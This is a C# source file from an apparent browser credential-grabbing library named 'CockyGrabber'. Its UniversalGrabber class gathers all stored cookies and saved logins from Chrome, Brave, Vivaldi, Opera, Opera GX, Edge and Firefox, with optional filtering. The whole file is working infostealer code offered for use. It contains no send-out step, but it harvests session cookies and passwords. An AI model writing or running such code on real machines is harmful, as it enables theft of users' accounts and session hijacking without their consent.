using System;
using System.Collections.Generic;

namespace CockyGrabber.Grabbers
{
    public class UniversalGrabber
    {
        #region Grabbers
        public ChromeGrabber CG { get; set; }
        public BraveGrabber BG { get; set; }
        public VivaldiGrabber VG { get; set; }
        public OperaGrabber OG { get; set; }
        public OperaGxGrabber OGG { get; set; }
        public EdgeGrabber EG { get; set; }
        public FirefoxGrabber FG { get; set; }
        #endregion

        public UniversalGrabber()
        {
            CG = new ChromeGrabber();
            BG = new BraveGrabber();
            VG = new VivaldiGrabber();
            OG = new OperaGrabber();
            OGG = new OperaGxGrabber();
            EG = new EdgeGrabber();
            FG = new FirefoxGrabber();
        }
        public UniversalGrabber(ChromeGrabber cg, BraveGrabber bg, VivaldiGrabber vg, OperaGrabber og, OperaGxGrabber ogg, EdgeGrabber eg, FirefoxGrabber fg)
        {
            CG = cg;
            BG = bg;
            VG = vg;
            OG = og;
            OGG = ogg;
            EG = eg;
            FG = fg;
        }

        #region GetCookies()
        public IEnumerable<Blink.Cookie> GetAllBlinkCookiesBy(Blink.CookieHeader by, object value)
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();

            // Add Cookies to list:
            if (CG.CookiesExist())
                cookies.AddRange(CG.GetCookiesBy(by, value));
            if (BG.CookiesExist())
                cookies.AddRange(BG.GetCookiesBy(by, value));
            if (VG.CookiesExist())
                cookies.AddRange(VG.GetCookiesBy(by, value));
            if (OG.CookiesExist())
                cookies.AddRange(OG.GetCookiesBy(by, value));
            if (OGG.CookiesExist())
                cookies.AddRange(OGG.GetCookiesBy(by, value));
            if (EG.CookiesExist())
                cookies.AddRange(EG.GetCookiesBy(by, value));

            return cookies;
        }
        public IEnumerable<Blink.Cookie> GetAllBlinkCookies()
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();

            // Add Cookies to list:
            if (CG.CookiesExist())
                cookies.AddRange(CG.GetCookies());
            if (BG.CookiesExist())
                cookies.AddRange(BG.GetCookies());
            if (VG.CookiesExist())
                cookies.AddRange(VG.GetCookies());
            if (OG.CookiesExist())
                cookies.AddRange(OG.GetCookies());
            if (OGG.CookiesExist())
                cookies.AddRange(OGG.GetCookies());
            if (EG.CookiesExist())
                cookies.AddRange(EG.GetCookies());

            return cookies;
        }

        public Tuple<IEnumerable<Blink.Cookie>, IEnumerable<Gecko.Cookie>> GetAllCookies()
            => new Tuple<IEnumerable<Blink.Cookie>, IEnumerable<Gecko.Cookie>>(GetAllBlinkCookies(), FG.GetCookies());
        #endregion

        #region GetLogins()
        public IEnumerable<Blink.Login> GetAllBlinkLoginsBy(Blink.LoginHeader by, object value)
        {
            List<Blink.Login> logins = new List<Blink.Login>();

            // Add Logins to list:
            if (CG.CookiesExist())
                logins.AddRange(CG.GetLoginsBy(by, value));
            if (BG.CookiesExist())
                logins.AddRange(BG.GetLoginsBy(by, value));
            if (VG.CookiesExist())
                logins.AddRange(VG.GetLoginsBy(by, value));
            if (OG.CookiesExist())
                logins.AddRange(OG.GetLoginsBy(by, value));
            if (OGG.CookiesExist())
                logins.AddRange(OGG.GetLoginsBy(by, value));
            if (EG.CookiesExist())
                logins.AddRange(EG.GetLoginsBy(by, value));

            return logins;
        }
        public IEnumerable<Blink.Login> GetAllBlinkLogins()
        {
            List<Blink.Login> logins = new List<Blink.Login>();

            // Add Logins to list:
            if (CG.CookiesExist())
                logins.AddRange(CG.GetLogins());
            if (BG.CookiesExist())
                logins.AddRange(BG.GetLogins());
            if (VG.CookiesExist())
                logins.AddRange(VG.GetLogins());
            if (OG.CookiesExist())
                logins.AddRange(OG.GetLogins());
            if (OGG.CookiesExist())
                logins.AddRange(OGG.GetLogins());
            if (EG.CookiesExist())
                logins.AddRange(EG.GetLogins());

            return logins;
        }

        public Tuple<IEnumerable<Blink.Login>, IEnumerable<Gecko.Login>> GetAllLogins()
            => new Tuple<IEnumerable<Blink.Login>, IEnumerable<Gecko.Login>>(GetAllBlinkLogins(), FG.GetLogins());
        #endregion
    }
}